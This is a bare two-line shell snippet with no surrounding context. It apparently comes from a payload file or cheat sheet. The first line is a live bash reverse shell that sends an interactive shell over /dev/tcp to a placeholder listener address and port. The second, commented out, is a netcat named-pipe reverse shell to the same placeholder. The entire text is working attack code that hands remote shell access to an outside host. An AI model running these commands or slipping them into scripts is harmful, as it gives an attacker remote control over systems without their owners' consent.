bash -c 'bash -i >/dev/tcp/$LISTENER_ADDRESS/$PORT 2>&1 0>&1 &'
# rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LISTENER_ADDRESS $PORT >/tmp/f